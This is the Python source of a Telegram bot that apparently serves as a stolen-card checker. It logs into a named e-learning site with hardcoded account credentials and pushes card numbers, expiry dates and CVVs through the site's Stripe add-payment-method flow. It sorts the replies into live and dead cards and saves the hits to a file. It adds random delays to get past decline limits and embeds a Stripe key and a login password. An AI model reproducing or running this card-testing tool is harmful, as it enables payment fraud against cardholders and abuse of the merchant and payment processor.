import os
import time
import json
import random
import asyncio
from html import unescape

import httpx
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

ADMIN_CHAT_ID = 7519839885  # ID TELEGRAM

def gets(s: str, start: str, end: str) -> str | None:
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
    try:
        cc, mes, ano, cvv = fullz.split("|")

        mes = mes.zfill(2)
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))
        current_month = int(time.strftime("%m"))

        try:
            expiry_month = int(mes)
            expiry_year = int(ano)
        except ValueError:
            return json.dumps({"error": {"message": "Invalid expiry date"}})

        if expiry_month < 1 or expiry_month > 12:
            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
        if expiry_year < current_year:
            return json.dumps({"error": {"message": "Expiration Year Invalid"}})
        if expiry_year == current_year and expiry_month < current_month:
            return json.dumps({"error": {"message": "Expiration Month Invalid"}})

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/login/', headers=headers)

        login = gets(response.text, '"learndash-login-form" value="', '" />')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        data = {
            'learndash-login-form': login,
            'pmpro_login_form_used': '1',
            'log': 'oliverjackson1209@gmail.com',
            'pwd': 'Oliverjack1209',
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/login/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/activity-feed/', headers=headers)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/activity-feed/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/my-account/payment-methods/', headers=headers)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/my-account/payment-methods/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)

        nonce = gets(response.text, '"add_card_nonce":"', '"')

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'type':'card',
            'billing_details[name]':'oliver jackson',
            'billing_details[email]':'oliverjackson1209@gmail.com',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid':'70a2e756-b5bf-4236-9956-f42eeb07c5b8273a5f',
            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid':'992dc1bf-9086-4997-865a-76988ba5154f55d68f',
            'payment_user_agent':'stripe.js/399197339e; stripe-js-v3/399197339e; split-card-element',
            'referrer':'https://elearntsg.com',
            'time_on_page':'116708',
            'client_attribution_metadata[client_session_id]':'36f62d63-5d9d-488b-beba-353f4cae2228',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        try:
            id = response.json()['id']
        except Exception:
            return response.text

        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = await session.post('https://elearntsg.com/', params=params, headers=headers, data=data)

        return response.text

    except Exception as e:
        return f"Exception: {str(e)}"

# Pakai API bin lookup dari drlabapis.onrender.com
async def get_bin_info(bin_number: str) -> dict:
    url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number}"
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(url)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    return {
                        "type": data.get("type"),
                        "brand": data.get("tier"),
                        "issuer": data.get("issuer"),
                        "country": data.get("country"),
                    }
                else:
                    return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
            else:
                return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
    except Exception:
        return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}

async def charge_resp(result):
    try:
        if (
            '{"status":"SUCCESS",' in result
            or '"status":"success"' in result
        ):
            response = "Payment method successfully added ✅"
        elif "Thank you for your donation" in result:
            response = "Payment successful! 🎉"
        elif "insufficient funds" in result or "card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif "Your card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif (
            "incorrect_cvc" in result
            or "security code is incorrect." in result
            or "Your card's security code is incorrect." in result
        ):
            response = "CVV INCORRECT ❎"
        elif "transaction_not_allowed" in result:
            response = "TRANSACTION NOT ALLOWED ❎"
        elif '"cvc_check": "pass"' in result:
            response = "CVV MATCH ✅"
        elif "requires_action" in result:
            response = "VERIFICATION 🚫"
        elif (
            "three_d_secure_redirect" in result
            or "card_error_authentication_required" in result
            or "wcpay-confirm-pi:" in result
        ):
            response = "3DS Required ❎"
        elif "stripe_3ds2_fingerprint" in result:
            response = "3DS Required ❎"
        elif "Your card does not support this type of purchase." in result:
            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
        elif (
            "generic_decline" in result
            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
            in result
            or "card_decline_rate_limit_exceeded" in result
            or "This transaction cannot be processed." in result
            or '"status":400,' in result
        ):
            response = "GENERIC DECLINED ❌"
        elif "do not honor" in result:
            response = "DO NOT HONOR ❌"
        elif "Suspicious activity detected. Try again in a few minutes." in result:
            response = "TRY AGAIN IN A FEW MINUTES ❌"
        elif "fraudulent" in result:
            response = "FRAUDULENT ❌ "
        elif "setup_intent_authentication_failure" in result:
            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
        elif "invalid cvc" in result:
            response = "INVALID CVV ❌"
        elif "stolen card" in result:
            response = "STOLEN CARD ❌"
        elif "lost_card" in result:
            response = "LOST CARD ❌"
        elif "pickup_card" in result:
            response = "PICKUP CARD ❌"
        elif "incorrect_number" in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif "Your card has expired." in result or "expired_card" in result:
            response = "EXPIRED CARD ❌"
        elif "intent_confirmation_challenge" in result:
            response = "CAPTCHA ❌"
        elif "Your card number is incorrect." in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif (
            "Your card's expiration year is invalid." in result
            or "Your card's expiration year is invalid." in result
        ):
            response = "EXPIRATION YEAR INVALID ❌"
        elif (
            "Your card's expiration month is invalid." in result
            or "invalid_expiry_month" in result
        ):
            response = "EXPIRATION MONTH INVALID ❌"
        elif "card is not supported." in result:
            response = "CARD NOT SUPPORTED ❌"
        elif "invalid account" in result:
            response = "DEAD CARD ❌"
        elif (
            "Invalid API Key provided" in result
            or "testmode_charges_only" in result
            or "api_key_expired" in result
            or "Your account cannot currently make live charges." in result
        ):
            response = "stripe error contact support@stripe.com for more details ❌"
        elif "Your card was declined." in result or "card was declined" in result:
            response = "CARD DECLINED ❌"
        elif "card number is incorrect." in result:
            response = "CARD NUMBER INCORRECT ❌"
        elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
        elif "card number is incomplete." in result:
            response = "CARD NUMBER INCOMPLETE ❌"
        elif "The order total is too high for this payment method" in result:
            response = "ORDER TO HIGH FOR THIS CARD ❌"
        elif "The order total is too low for this payment method" in result:
            response = "ORDER TO LOW FOR THIS CARD ❌"
        elif "Please Update Bearer Token" in result:
            response = "Token Expired Admin Has Been Notified ❌"
        else:
            response = result + "❌"
            with open("result_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{result}\n")

        return response
    except Exception as e:
        return f"{str(e)} ❌"

async def multi_checking(fullz: str) -> str:
    start = time.time()
    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(fullz, session)
        response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    bin_number = fullz.split("|")[0][:6]
    bin_info = await get_bin_info(bin_number)

    error_message = ""
    try:
        json_resp = json.loads(result)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        pass

    bin_text = (
        f"𝗧𝘆𝗽𝗲: » {bin_info['type']}\n"
        f"𝗕𝗿𝗮𝗻𝗱: » {bin_info['brand']}\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿: » {bin_info['issuer']}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {bin_info['country']}\n"
    )

    if error_message:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s\n"
            f"{bin_text}"
        )
    else:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s\n"
            f"{bin_text}"
        )
        if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            with open("auth.txt", "a", encoding="utf-8") as file:
                file.write(output + "\n")

    return output

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return
    await update.message.reply_text(
        "𝗣𝗔𝗥𝗔𝗘𝗟 𝗕𝗢𝗧\n"
        "SEND CARD IN FORMAT\n"
        "CC|MM|YY|CVV\n"
    )

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    text = update.message.text.strip()
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')

    try:
        for line in lines:
            parts = line.split("|")
            if len(parts) != 4:
                await update.message.reply_text(
                    f"WRONG FORMAT:\n<code>{line}</code>\nUSE FORMAT: CC|MM|YYYY|CVV",
                    parse_mode='HTML'
                )
                continue

            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]

            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"

            await asyncio.sleep(random.uniform(4, 7))

            result = await multi_checking(cc_formatted)
            await update.message.reply_text(result, parse_mode='HTML')

        await msg.delete()
    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")

def main() -> None:
    application = ApplicationBuilder().token(os.getenv("TOKEN")).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))

    print("PARAEL CHECKER BOT RUNNING...")
    application.run_polling()

if __name__ == "__main__":
    main()
